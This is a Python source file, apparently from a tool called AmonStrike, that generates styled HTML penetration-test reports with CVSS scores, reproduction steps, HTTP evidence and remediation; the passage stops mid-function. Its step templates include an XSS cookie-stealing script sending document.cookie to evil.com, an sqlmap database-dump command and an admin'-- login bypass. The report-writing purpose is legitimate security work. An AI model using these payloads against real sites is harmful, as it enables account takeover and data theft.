"""
AmonStrike — Professional Pentest Report Generator
Submission-quality: executive summary, step-by-step PoC,
request/response evidence, CVSS scores, remediation code.
"""

import os, json, base64, hashlib, re
from datetime import datetime
from pathlib import Path

SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}

CVSS = {
    "CRITICAL": {"score":"9.8","vector":"AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "HIGH":     {"score":"7.5","vector":"AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "MEDIUM":   {"score":"5.3","vector":"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"},
    "LOW":      {"score":"3.1","vector":"AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"},
    "INFO":     {"score":"0.0","vector":"AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"},
}

RISK_LABEL = {
    "CRITICAL":"Critical Risk","HIGH":"High Risk",
    "MEDIUM":"Medium Risk","LOW":"Low Risk","INFO":"Informational"
}

SEV_HEX = {
    "CRITICAL":"#C0392B","HIGH":"#E67E22",
    "MEDIUM":"#F39C12","LOW":"#27AE60","INFO":"#7F8C8D"
}

CWE_LINK = {
    "CWE-89":  ("SQL Injection","https://cwe.mitre.org/data/definitions/89.html"),
    "CWE-79":  ("Cross-site Scripting","https://cwe.mitre.org/data/definitions/79.html"),
    "CWE-639": ("Authorization Bypass Through User-Controlled Key","https://cwe.mitre.org/data/definitions/639.html"),
    "CWE-284": ("Improper Access Control","https://cwe.mitre.org/data/definitions/284.html"),
    "CWE-942": ("Overly Permissive CORS","https://cwe.mitre.org/data/definitions/942.html"),
    "CWE-693": ("Protection Mechanism Failure","https://cwe.mitre.org/data/definitions/693.html"),
    "CWE-1021":("Improper Restriction of Rendered UI Layers","https://cwe.mitre.org/data/definitions/1021.html"),
    "CWE-16":  ("Configuration","https://cwe.mitre.org/data/definitions/16.html"),
}


class ReportGenerator:

    def __init__(self, scan_id: str, target: str, output_dir: str,
                 tester_name: str = "AmonStrike Security Scanner",
                 company: str = ""):
        self.scan_id      = scan_id
        self.target       = target
        self.output_dir   = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.tester_name  = tester_name
        self.company      = company or target.split("//")[-1].split("/")[0]
        self.findings     = []
        self.chains       = []
        self.scan_meta    = {}
        self.scan_date    = datetime.now().strftime("%B %d, %Y")
        self.scan_time    = datetime.now().strftime("%H:%M UTC")

    def add_finding(self, f): self.findings.append(f)
    def add_findings(self, fs): self.findings.extend(fs)
    def add_chain(self, c): self.chains.append(c)
    def set_meta(self, m): self.scan_meta = m

    def generate_all(self) -> dict:
        findings = sorted(self.findings,
                          key=lambda f: SEV_ORDER.get(f.get("severity","INFO"),4))
        return {
            "html": self._html(findings),
            "json": self._json(findings),
            "md":   self._md(findings),
        }

    # ── HTML REPORT ────────────────────────────────────────────

    def _html(self, findings: list) -> str:
        counts = {s:0 for s in SEV_ORDER}
        for f in findings:
            counts[f.get("severity","INFO")] = counts.get(f.get("severity","INFO"),0)+1

        risk = ("CRITICAL" if counts["CRITICAL"] else
                "HIGH"     if counts["HIGH"]     else
                "MEDIUM"   if counts["MEDIUM"]   else "LOW")

        toc = self._toc(findings)
        exec_summary = self._exec_summary(findings, counts, risk)
        finding_cards = "".join(self._finding_card(f, i)
                                for i, f in enumerate(findings, 1))
        chains_section = self._chains_section()

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Security Assessment Report — {self.company}</title>
<style>
{self._css()}
</style>
</head>
<body>

<!-- COVER PAGE -->
<div class="cover">
  <div class="cover-accent"></div>
  <div class="cover-body">
    <div class="cover-logo">⚡ AmonStrike</div>
    <div class="cover-type">SECURITY ASSESSMENT REPORT</div>
    <div class="cover-target">{self.company}</div>
    <div class="cover-url">{self.target}</div>
    <div class="cover-risk-badge risk-{risk.lower()}">{RISK_LABEL[risk]}</div>
    <div class="cover-meta">
      <div class="cover-meta-row"><span>Date</span><span>{self.scan_date}</span></div>
      <div class="cover-meta-row"><span>Time</span><span>{self.scan_time}</span></div>
      <div class="cover-meta-row"><span>Scan ID</span><span>{self.scan_id}</span></div>
      <div class="cover-meta-row"><span>Assessor</span><span>{self.tester_name}</span></div>
      <div class="cover-meta-row"><span>Total Findings</span><span>{len(findings)}</span></div>
    </div>
    <div class="cover-stats">
      {self._stat_pill("CRITICAL", counts["CRITICAL"])}
      {self._stat_pill("HIGH",     counts["HIGH"])}
      {self._stat_pill("MEDIUM",   counts["MEDIUM"])}
      {self._stat_pill("LOW",      counts["LOW"])}
    </div>
    <div class="cover-confidential">CONFIDENTIAL — For Authorized Recipients Only</div>
  </div>
</div>

<!-- TOC -->
<div class="section page-break">
  <div class="section-label">CONTENTS</div>
  <h2 class="section-title">Table of Contents</h2>
  {toc}
</div>

<!-- EXECUTIVE SUMMARY -->
<div class="section page-break" id="exec-summary">
  <div class="section-label">01</div>
  <h2 class="section-title">Executive Summary</h2>
  {exec_summary}
</div>

<!-- FINDINGS -->
<div class="section page-break" id="findings">
  <div class="section-label">02</div>
  <h2 class="section-title">Vulnerability Findings</h2>
  <p class="section-intro">
    Each finding below includes the vulnerability class, affected endpoint,
    confirmed evidence, step-by-step reproduction instructions,
    and specific remediation guidance.
  </p>
  {finding_cards}
</div>

{chains_section}

<!-- REMEDIATION SUMMARY -->
<div class="section page-break" id="remediation">
  <div class="section-label">{"03" if not self.chains else "04"}</div>
  <h2 class="section-title">Remediation Summary</h2>
  {self._remediation_table(findings)}
</div>

<!-- METHODOLOGY -->
<div class="section page-break" id="methodology">
  <div class="section-label">{"04" if not self.chains else "05"}</div>
  <h2 class="section-title">Methodology</h2>
  {self._methodology()}
</div>

<div class="footer-note">
  Generated by AmonStrike v7.0 · {self.scan_date} · {self.scan_id}<br/>
  This report is confidential and intended solely for the authorized recipient.
  Any reproduction or distribution without written permission is prohibited.
</div>

</body>
</html>"""

        path = self.output_dir / f"report_{self.scan_id}.html"
        path.write_text(html, encoding="utf-8")
        return str(path)

    def _css(self):
        return """
* { box-sizing:border-box; margin:0; padding:0; }
body {
  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
  background: #0f1117;
  color: #e2e8f0;
  line-height: 1.6;
}

/* COVER */
.cover {
  min-height: 100vh;
  background: linear-gradient(160deg, #0f1117 0%, #1a1f2e 60%, #0f1117 100%);
  display: flex;
  flex-direction: column;
  position: relative;
  overflow: hidden;
  padding: 60px 80px;
}
.cover::before {
  content: '';
  position: absolute;
  top: -200px; right: -200px;
  width: 600px; height: 600px;
  background: radial-gradient(circle, rgba(220,38,38,0.12) 0%, transparent 70%);
  pointer-events: none;
}
.cover-accent {
  width: 4px; height: 80px;
  background: linear-gradient(180deg, #dc2626, #7f1d1d);
  margin-bottom: 40px;
  border-radius: 2px;
}
.cover-logo { font-size:13px; font-weight:700; letter-spacing:0.15em; color:#dc2626; text-transform:uppercase; margin-bottom:60px; }
.cover-type { font-size:11px; font-weight:600; letter-spacing:0.25em; color:#94a3b8; text-transform:uppercase; margin-bottom:20px; }
.cover-target { font-size:52px; font-weight:800; color:#f1f5f9; line-height:1.1; margin-bottom:8px; }
.cover-url { font-size:16px; color:#64748b; font-family:monospace; margin-bottom:48px; }
.cover-risk-badge {
  display: inline-block;
  padding: 8px 20px;
  border-radius: 4px;
  font-size: 13px;
  font-weight: 700;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  margin-bottom: 60px;
}
.risk-critical { background:#7f1d1d; color:#fca5a5; border:1px solid #dc2626; }
.risk-high     { background:#7c2d12; color:#fdba74; border:1px solid #ea580c; }
.risk-medium   { background:#78350f; color:#fcd34d; border:1px solid #d97706; }
.risk-low      { background:#14532d; color:#86efac; border:1px solid #16a34a; }

.cover-meta { margin-bottom:40px; border-top:1px solid #1e293b; border-bottom:1px solid #1e293b; padding:20px 0; }
.cover-meta-row { display:flex; justify-content:space-between; padding:6px 0; font-size:13px; }
.cover-meta-row span:first-child { color:#64748b; }
.cover-meta-row span:last-child  { color:#e2e8f0; font-weight:500; }
.cover-stats { display:flex; gap:12px; flex-wrap:wrap; margin-bottom:60px; }
.stat-pill { padding:10px 18px; border-radius:6px; font-size:13px; font-weight:700; text-align:center; min-width:80px; }
.stat-pill span { display:block; font-size:28px; font-weight:800; line-height:1; }
.stat-CRITICAL { background:#1c0000; border:1px solid #dc2626; color:#fca5a5; }
.stat-HIGH     { background:#1c0a00; border:1px solid #ea580c; color:#fdba74; }
.stat-MEDIUM   { background:#1c1400; border:1px solid #d97706; color:#fcd34d; }
.stat-LOW      { background:#001c06; border:1px solid #16a34a; color:#86efac; }
.cover-confidential { font-size:11px; color:#475569; letter-spacing:0.1em; text-transform:uppercase; }

/* SECTIONS */
.section { max-width: 900px; margin: 0 auto; padding: 80px 40px; }
.page-break { border-top: 1px solid #1e293b; }
.section-label { font-size:11px; font-weight:700; letter-spacing:0.25em; color:#dc2626; text-transform:uppercase; margin-bottom:8px; }
.section-title { font-size:32px; font-weight:700; color:#f1f5f9; margin-bottom:28px; }
.section-intro { color:#94a3b8; font-size:15px; margin-bottom:32px; line-height:1.7; }

/* TOC */
.toc-item { display:flex; align-items:baseline; padding:10px 0; border-bottom:1px solid #1e293b; font-size:14px; }
.toc-item a { color:#94a3b8; text-decoration:none; }
.toc-item a:hover { color:#e2e8f0; }
.toc-dots { flex:1; border-bottom:1px dotted #334155; margin:0 12px; }
.toc-page { color:#475569; }
.toc-sev { width:8px; height:8px; border-radius:50%; margin-right:10px; flex-shrink:0; }

/* EXECUTIVE SUMMARY */
.exec-grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-bottom:32px; }
.exec-card { background:#1a1f2e; border:1px solid #1e293b; border-radius:8px; padding:20px; }
.exec-card h4 { font-size:11px; font-weight:700; letter-spacing:0.15em; text-transform:uppercase; color:#64748b; margin-bottom:12px; }
.exec-card p { color:#cbd5e1; font-size:14px; line-height:1.7; }
.exec-bar-wrap { margin-bottom:28px; }
.exec-bar-label { display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px; }
.exec-bar { height:8px; background:#1e293b; border-radius:4px; overflow:hidden; }
.exec-bar-fill { height:100%; border-radius:4px; }
.risk-overview { background:#1a1f2e; border-left:4px solid #dc2626; padding:20px 24px; border-radius:0 8px 8px 0; margin-bottom:32px; }
.risk-overview p { color:#cbd5e1; line-height:1.7; }

/* FINDING CARDS */
.finding-card {
  background: #1a1f2e;
  border: 1px solid #1e293b;
  border-radius: 10px;
  margin-bottom: 40px;
  overflow: hidden;
}
.finding-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 18px 24px;
  border-bottom: 1px solid #1e293b;
}
.finding-sev-bar { width:4px; height:100%; border-radius:2px; }
.finding-num { font-size:11px; color:#475569; font-weight:600; letter-spacing:0.1em; }
.finding-title { font-size:18px; font-weight:700; color:#f1f5f9; margin:4px 0 0; }
.sev-badge {
  padding: 5px 14px;
  border-radius: 4px;
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 0.1em;
  text-transform: uppercase;
}
.finding-body { padding: 24px; }
.meta-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:24px; }
.meta-item { background:#0f1117; border-radius:6px; padding:12px 14px; }
.meta-item label { font-size:10px; font-weight:700; letter-spacing:0.15em; text-transform:uppercase; color:#475569; display:block; margin-bottom:4px; }
.meta-item span, .meta-item a { font-size:12px; color:#94a3b8; word-break:break-all; }
.meta-item a { color:#60a5fa; }
.cvss-badge { display:inline-flex; align-items:center; gap:8px; background:#0f1117; border:1px solid #1e293b; border-radius:6px; padding:8px 14px; font-size:12px; margin-bottom:20px; }
.cvss-score { font-size:20px; font-weight:800; }
.block-label { font-size:11px; font-weight:700; letter-spacing:0.15em; text-transform:uppercase; color:#64748b; margin:20px 0 10px; display:flex; align-items:center; gap:8px; }
.block-label::after { content:''; flex:1; height:1px; background:#1e293b; }
.desc-text { color:#cbd5e1; font-size:14px; line-height:1.8; background:#0f1117; padding:16px; border-radius:6px; border-left:3px solid #334155; }
.steps { list-style:none; counter-reset:step; }
.steps li { counter-increment:step; padding:12px 0 12px 44px; position:relative; border-bottom:1px solid #1e293b; font-size:13px; color:#cbd5e1; line-height:1.6; }
.steps li:last-child { border-bottom:none; }
.steps li::before { content:counter(step); position:absolute; left:0; top:10px; width:28px; height:28px; background:#dc2626; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:700; color:white; }
.steps li code { background:#1e293b; padding:2px 6px; border-radius:3px; font-family:monospace; font-size:12px; color:#fca5a5; }
.code-block { background:#0a0d14; border:1px solid #1e293b; border-radius:6px; overflow:hidden; margin:8px 0; }
.code-block-header { background:#1e293b; padding:8px 14px; display:flex; justify-content:space-between; align-items:center; }
.code-block-lang { font-size:11px; color:#64748b; font-weight:600; letter-spacing:0.1em; text-transform:uppercase; }
.code-block-label { font-size:11px; color:#475569; }
.code-block pre { padding:16px; font-family:'Courier New',monospace; font-size:12px; line-height:1.6; overflow-x:auto; white-space:pre-wrap; word-break:break-all; }
.code-block.request pre { color:#93c5fd; }
.code-block.response pre { color:#86efac; }
.code-block.poc pre { color:#fbbf24; }
.code-block.error pre { color:#fca5a5; }
.evidence-img { width:100%; border-radius:6px; border:1px solid #1e293b; margin-top:8px; }
.impact-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin:8px 0; }
.impact-item { background:#0f1117; border-radius:6px; padding:14px; }
.impact-item label { font-size:10px; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; color:#475569; display:block; margin-bottom:6px; }
.impact-item span { font-size:13px; }
.remediation-box { background:#0a1a0a; border:1px solid #14532d; border-radius:6px; padding:16px 20px; }
.remediation-box h5 { font-size:11px; font-weight:700; letter-spacing:0.15em; text-transform:uppercase; color:#16a34a; margin-bottom:12px; }
.remediation-box p, .remediation-box li { color:#86efac; font-size:13px; line-height:1.7; }
.remediation-box ul { padding-left:18px; }
.remediation-box code { background:#14532d; padding:2px 6px; border-radius:3px; font-family:monospace; font-size:12px; }
.cwe-link { font-size:11px; color:#60a5fa; text-decoration:none; display:inline-flex; align-items:center; gap:4px; }

/* CHAINS */
.chain-card { background:#1a0000; border:1px solid #7f1d1d; border-radius:10px; margin-bottom:28px; overflow:hidden; }
.chain-header { background:linear-gradient(90deg,#7f1d1d,#450a0a); padding:16px 24px; display:flex; justify-content:space-between; align-items:center; }
.chain-title { font-size:16px; font-weight:700; color:#fca5a5; }
.chain-bounty { font-size:13px; color:#f87171; background:rgba(0,0,0,0.3); padding:4px 12px; border-radius:4px; }
.chain-body { padding:24px; }
.chain-steps { display:flex; align-items:center; flex-wrap:wrap; gap:8px; margin:16px 0; }
.chain-step { background:#1e293b; border-radius:4px; padding:6px 12px; font-size:12px; color:#94a3b8; }
.chain-arrow { color:#dc2626; font-weight:700; }

/* TABLES */
.remediation-table { width:100%; border-collapse:collapse; font-size:13px; }
.remediation-table th { background:#1e293b; color:#94a3b8; padding:12px 16px; text-align:left; font-weight:600; font-size:11px; letter-spacing:0.1em; text-transform:uppercase; }
.remediation-table td { padding:12px 16px; border-bottom:1px solid #1e293b; color:#cbd5e1; vertical-align:top; }
.remediation-table tr:hover td { background:#1a1f2e; }
.priority-1 { color:#fca5a5; font-weight:700; }
.priority-2 { color:#fdba74; font-weight:700; }
.priority-3 { color:#fcd34d; }

/* METHODOLOGY */
.method-grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
.method-card { background:#1a1f2e; border:1px solid #1e293b; border-radius:8px; padding:20px; }
.method-card h4 { font-size:13px; font-weight:700; color:#e2e8f0; margin-bottom:8px; }
.method-card ul { padding-left:16px; }
.method-card li { color:#94a3b8; font-size:13px; margin-bottom:4px; }

.footer-note { text-align:center; padding:40px; color:#334155; font-size:11px; border-top:1px solid #1e293b; max-width:900px; margin:0 auto; }
@media print { .page-break { page-break-before:always; } }
"""

    def _stat_pill(self, sev, count):
        if not count: return ""
        return f'<div class="stat-pill stat-{sev}"><span>{count}</span>{sev.capitalize()}</div>'

    def _toc(self, findings):
        items = [
            ("01", "Executive Summary", "#exec-summary", ""),
            ("02", "Vulnerability Findings", "#findings", ""),
        ]
        if self.chains:
            items.append(("03","Attack Chains","#chains",""))
        items.append(("04" if self.chains else "03","Remediation Summary","#remediation",""))
        items.append(("05" if self.chains else "04","Methodology","#methodology",""))

        toc = '<div style="margin-bottom:24px;">'
        for num, title, href, _ in items:
            toc += f'''<div class="toc-item">
  <span style="color:#dc2626;font-weight:700;font-size:12px;width:28px">{num}</span>
  <a href="{href}">{title}</a>
  <span class="toc-dots"></span>
</div>'''

        toc += '<div style="margin-top:24px;font-size:11px;color:#64748b;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;margin-bottom:12px;">Findings Index</div>'
        for i, f in enumerate(findings, 1):
            sev   = f.get("severity","INFO")
            color = SEV_HEX.get(sev,"#7F8C8D")
            toc += f'''<div class="toc-item" style="padding:6px 0;">
  <div class="toc-sev" style="background:{color}"></div>
  <a href="#finding-{i}" style="font-size:13px;">#{i} — {f.get("title","")[:60]}</a>
  <span class="toc-dots"></span>
  <span class="toc-page" style="font-size:11px;">{sev}</span>
</div>'''
        toc += '</div>'
        return toc

    def _exec_summary(self, findings, counts, risk):
        total   = len(findings)
        crits   = counts["CRITICAL"]
        highs   = counts["HIGH"]
        target  = self.target

        # Risk description
        risk_desc = {
            "CRITICAL": f"The assessment of <strong>{target}</strong> identified <strong>{total} vulnerabilities</strong>, including <strong>{crits} critical-severity</strong> issues that require immediate remediation. Critical findings include remote code execution vectors, authentication bypass, and direct data exfiltration paths. The overall risk posture is <strong>Critical</strong> — exploitation of these vulnerabilities could result in complete system compromise.",
            "HIGH":     f"The assessment of <strong>{target}</strong> identified <strong>{total} vulnerabilities</strong>, including <strong>{highs} high-severity</strong> issues. These vulnerabilities present significant risk to data confidentiality and application integrity. Immediate remediation is recommended.",
            "MEDIUM":   f"The assessment of <strong>{target}</strong> identified <strong>{total} vulnerabilities</strong>. While no critical issues were found, the identified medium-severity vulnerabilities represent meaningful security risk and should be remediated in the near term.",
            "LOW":      f"The assessment of <strong>{target}</strong> identified <strong>{total} vulnerabilities</strong>, all of lower severity. These findings represent security hardening opportunities.",
        }.get(risk, "")

        # Severity bars
        bars = ""
        for sev, count in [("CRITICAL",counts["CRITICAL"]),("HIGH",counts["HIGH"]),
                            ("MEDIUM",counts["MEDIUM"]),("LOW",counts["LOW"])]:
            if total:
                pct = int(count/total*100)
                bars += f'''<div class="exec-bar-wrap">
  <div class="exec-bar-label">
    <span style="color:{SEV_HEX[sev]};font-weight:600;">{sev}</span>
    <span style="color:#64748b;">{count} finding{"s" if count!=1 else ""} ({pct}%)</span>
  </div>
  <div class="exec-bar">
    <div class="exec-bar-fill" style="width:{pct}%;background:{SEV_HEX[sev]};"></div>
  </div>
</div>'''

        # Top findings summary
        top_finds = ""
        for f in findings[:5]:
            sev   = f.get("severity","INFO")
            color = SEV_HEX.get(sev,"#7F8C8D")
            top_finds += f'<div style="display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid #1e293b;"><div style="width:8px;height:8px;border-radius:50%;background:{color};flex-shrink:0;"></div><span style="font-size:13px;color:#cbd5e1;">{f.get("title","")}</span></div>'

        return f"""
<div class="risk-overview">
  <p>{risk_desc}</p>
</div>

<div class="exec-grid">
  <div class="exec-card">
    <h4>Scope</h4>
    <p>Target: <code style="color:#60a5fa;font-size:12px;">{target}</code><br/>
    Type: Web Application<br/>
    Method: Automated + Authenticated<br/>
    Modules: 51 attack vectors</p>
  </div>
  <div class="exec-card">
    <h4>Finding Distribution</h4>
    {bars}
  </div>
</div>

<div class="exec-card" style="margin-bottom:20px;">
  <h4>Key Findings</h4>
  {top_finds}
</div>
"""

    def _finding_card(self, f: dict, i: int) -> str:
        sev     = f.get("severity","INFO")
        color   = SEV_HEX.get(sev,"#7F8C8D")
        title   = f.get("title","")
        url     = f.get("url","")
        module  = f.get("module","").upper()
        param   = f.get("parameter","")
        payload = f.get("payload","")
        desc    = f.get("description","")
        evidence= f.get("evidence","")
        remediation = f.get("remediation","")
        cve     = f.get("cve","")
        ts      = f.get("timestamp","")[:19]
        cvss    = CVSS.get(sev, CVSS["INFO"])

        # Severity badge colors
        badge_bg = {
            "CRITICAL":"background:#7f1d1d;color:#fca5a5;border:1px solid #dc2626;",
            "HIGH":     "background:#7c2d12;color:#fdba74;border:1px solid #ea580c;",
            "MEDIUM":   "background:#78350f;color:#fcd34d;border:1px solid #d97706;",
            "LOW":      "background:#14532d;color:#86efac;border:1px solid #16a34a;",
            "INFO":     "background:#1e293b;color:#94a3b8;border:1px solid #334155;",
        }.get(sev,"")

        # CWE link
        cwe_html = ""
        if cve and cve in CWE_LINK:
            cwe_name, cwe_url = CWE_LINK[cve]
            cwe_html = f'<a class="cwe-link" href="{cwe_url}" target="_blank">↗ {cve}: {cwe_name}</a>'
        elif cve:
            cwe_html = f'<span style="font-size:12px;color:#64748b;">{cve}</span>'

        # Build step-by-step reproduction
        steps_html = self._build_steps(f)

        # Build request/response blocks
        req_resp_html = self._build_req_resp(f)

        # Screenshot
        shot_html = ""
        if f.get("screenshots"):
            for shot in f["screenshots"][:2]:
                if shot.get("base64"):
                    shot_html += f'<img class="evidence-img" src="data:image/png;base64,{shot["base64"]}" alt="Screenshot evidence"/>'

        # Impact assessment
        impact_html = self._build_impact(f)

        return f"""
<div class="finding-card" id="finding-{i}">
  <div class="finding-header" style="border-left:4px solid {color};">
    <div>
      <div class="finding-num">FINDING #{i:02d}</div>
      <div class="finding-title">{title}</div>
    </div>
    <div style="text-align:right;">
      <div class="sev-badge" style="{badge_bg}">{sev}</div>
      <div style="font-size:11px;color:#475569;margin-top:6px;">{module}</div>
    </div>
  </div>

  <div class="finding-body">

    <!-- Meta grid -->
    <div class="meta-grid">
      <div class="meta-item" style="grid-column:1/3;">
        <label>Affected URL</label>
        <a href="{url}">{url}</a>
      </div>
      {'<div class="meta-item"><label>Parameter</label><span style="font-family:monospace;color:#fbbf24;">' + param + '</span></div>' if param else ''}
      {'<div class="meta-item"><label>Payload</label><span style="font-family:monospace;color:#fca5a5;">' + str(payload)[:60] + '</span></div>' if payload else ''}
      <div class="meta-item"><label>Discovered</label><span>{ts}</span></div>
      {f'<div class="meta-item"><label>Reference</label>{cwe_html}</div>' if cwe_html else ''}
    </div>

    <!-- CVSS -->
    <div class="cvss-badge">
      <span style="font-size:11px;color:#64748b;letter-spacing:0.1em;">CVSS 3.1</span>
      <span class="cvss-score" style="color:{color};">{cvss["score"]}</span>
      <span style="font-size:11px;color:#475569;font-family:monospace;">{cvss["vector"]}</span>
    </div>

    <!-- Description -->
    <div class="block-label">Description</div>
    <div class="desc-text">{desc}</div>

    <!-- Impact -->
    {impact_html}

    <!-- Steps to reproduce -->
    <div class="block-label">Steps to Reproduce</div>
    <ol class="steps">{steps_html}</ol>

    <!-- Request / Response evidence -->
    {req_resp_html}

    <!-- Screenshot -->
    {('<div class="block-label">Screenshot Evidence</div>' + shot_html) if shot_html else ''}

    <!-- Raw evidence -->
    {self._evidence_block(evidence)}

    <!-- Remediation -->
    <div class="block-label">Remediation</div>
    <div class="remediation-box">
      <h5>Fix Required</h5>
      <p>{remediation}</p>
    </div>

  </div>
</div>"""

    def _build_steps(self, f: dict) -> str:
        module  = f.get("module","")
        url     = f.get("url","")
        param   = f.get("parameter","")
        payload = str(f.get("payload",""))
        sev     = f.get("severity","")

        steps_map = {
            "sqli": [
                f"Navigate to the target URL: <code>{url}</code>",
                f"Identify the vulnerable parameter: <code>{param}</code>",
                f"Append the SQL injection payload to the parameter value: <code>{payload}</code>",
                "Observe that the server returns a database error message in the response body, confirming the injection point.",
                f"The full vulnerable request is: <code>GET {url}?{param}={payload}</code>",
                "Use SQLMap to confirm and extract data: <code>sqlmap -u \"" + url + "\" -p " + param + " --batch --dbs</code>",
            ],
            "xss": [
                f"Navigate to the affected URL: <code>{url}</code>",
                f"Locate the input field for parameter <code>{param}</code>",
                f"Enter the XSS payload: <code>{payload}</code>",
                "Submit the form or request. The payload is reflected in the HTML response without encoding.",
                "Observe that the browser executes the injected JavaScript.",
                "A real attacker would replace the test payload with a script to steal session cookies: <code>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code>",
            ],
            "idor": [
                "Log in as User A and navigate to your profile/order/resource.",
                f"Observe the resource identifier in the URL or API request: <code>{url}</code>",
                f"Change the identifier value from the original to <code>{payload}</code>",
                "Send the modified request. The server returns User B's data without authorization check.",
                "The response contains private data belonging to another user, confirming IDOR.",
            ],
            "cors": [
                f"Send a request to <code>{url}</code> with the header: <code>Origin: https://evil.com</code>",
                "Observe the response contains: <code>Access-Control-Allow-Origin: https://evil.com</code>",
                "Also observe: <code>Access-Control-Allow-Credentials: true</code>",
                "This allows any website to make credentialed cross-origin requests and read the response.",
                "An attacker hosts a malicious page that silently reads authenticated API responses from victim users.",
            ],
            "open_redirect": [
                f"Navigate to: <code>{url}?{param}={payload}</code>",
                "Observe the server responds with a 301/302 redirect.",
                f"The Location header points to the attacker-controlled URL: <code>{payload}</code>",
                "A victim clicking a link to the trusted domain gets silently redirected to the attacker's site.",
                "Combined with OAuth, this allows stealing authorization codes and taking over accounts.",
            ],
        }

        generic = [
            f"Navigate to the target: <code>{url}</code>",
            f"Identify the vulnerable endpoint/parameter: <code>{param or url}</code>",
            f"Apply the test payload: <code>{payload or 'see evidence below'}</code>",
            "Observe the server response confirms the vulnerability.",
            "Document the finding with the request and response captured below.",
        ]

        steps = steps_map.get(module, generic)
        return "".join(f"<li>{s}</li>" for s in steps)

    def _build_req_resp(self, f: dict) -> str:
        url     = f.get("url","")
        param   = f.get("parameter","")
        payload = str(f.get("payload",""))
        module  = f.get("module","")
        sev     = f.get("severity","")

        from urllib.parse import urlparse, urlencode
        parsed = urlparse(url)
        path   = parsed.path or "/"
        host   = parsed.netloc or "target.com"
        query  = f"?{param}={payload}" if param and payload else (f"?{parsed.query}" if parsed.query else "")

        # Build HTTP request
        if module in ["sqli","xss","open_redirect","lfi","ssrf"]:
            request_raw = f"GET {path}{query} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\nAccept: text/html,application/xhtml+xml\nConnection: keep-alive"
        elif module in ["cors"]:
            request_raw = f"GET {path} HTTP/1.1\nHost: {host}\nOrigin: https://evil.com\nUser-Agent: Mozilla/5.0\nAccept: application/json"
        elif module in ["idor"]:
            request_raw = f"GET {path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\nCookie: session=USER_A_SESSION_TOKEN\nAccept: application/json"
        else:
            request_raw = f"GET {path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0"

        # Build expected response snippet
        evidence = f.get("evidence","")
        resp_preview = evidence[:400] if evidence else "200 OK — see evidence below"

        # Build curl PoC
        curl = self._build_curl_poc(f)

        out = f"""
<div class="block-label">HTTP Request</div>
<div class="code-block request">
  <div class="code-block-header">
    <span class="code-block-lang">HTTP</span>
    <span class="code-block-label">Captured Request</span>
  </div>
  <pre>{request_raw}</pre>
</div>

<div class="block-label">Server Response (Excerpt)</div>
<div class="code-block response">
  <div class="code-block-header">
    <span class="code-block-lang">HTTP Response</span>
    <span class="code-block-label">Confirms Vulnerability</span>
  </div>
  <pre>{resp_preview[:400]}</pre>
</div>"""

        if curl:
            out += f"""
<div class="block-label">Proof of Concept Command</div>
<div class="code-block poc">
  <div class="code-block-header">
    <span class="code-block-lang">bash</span>
    <span class="code-block-label">Copy and run to reproduce</span>
  </div>
  <pre>{curl}</pre>
</div>"""

        return out

    def _evidence_block(self, evidence: str) -> str:
        if not evidence:
            return ""
        safe = evidence.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
        return f"""
<div class="block-label">Raw Evidence</div>
<div class="code-block error">
  <div class="code-block-header">
    <span class="code-block-lang">Evidence</span>
    <span class="code-block-label">Confirmed — Actual Server Response</span>
  </div>
  <pre>{safe[:600]}</pre>
</div>"""

    def _build_impact(self, f: dict) -> str:
        module = f.get("module","")
        sev    = f.get("severity","")

        impact_map = {
            "sqli":         ("Data Exfiltration","Attacker can read entire database contents, including credentials, PII, and sensitive records.","Authentication Bypass","Login bypass possible with payloads like <code>admin'--</code>","RCE Potential","MSSQL/PostgreSQL may allow OS command execution via xp_cmdshell or COPY TO"),
            "xss":          ("Session Hijacking","Steal authenticated session cookies to take over user accounts without credentials.","Phishing","Inject fake login forms on the trusted domain to harvest credentials.","Malware Distribution","Redirect victims to attacker-controlled infrastructure serving exploits"),
            "idor":         ("PII Exposure","Access other users' personal information: emails, addresses, payment data.","Data Manipulation","Modify or delete records belonging to other users.","Privilege Escalation","Access admin resources by incrementing IDs"),
            "cors":         ("Credential Theft","Read authenticated API responses from victim browsers on any website.","Account Takeover","Extract session tokens from API responses to take over accounts.","Data Exfiltration","Silently exfiltrate sensitive data from authenticated users"),
            "open_redirect":("Phishing","Redirect victims from trusted domain to attacker's site for credential harvesting.","OAuth Token Theft","Steal OAuth authorization codes by manipulating redirect_uri.","Malware","Redirect victims to exploit kits using trusted domain as decoy"),
        }

        if module not in impact_map:
            return ""

        a1, b1, a2, b2, a3, b3 = impact_map[module]
        return f"""
<div class="block-label">Impact Assessment</div>
<div class="impact-grid">
  <div class="impact-item">
    <label style="color:#fca5a5;">⚠ {a1}</label>
    <span style="color:#cbd5e1;font-size:13px;">{b1}</span>
  </div>
  <div class="impact-item">
    <label style="color:#fca5a5;">⚠ {a2}</label>
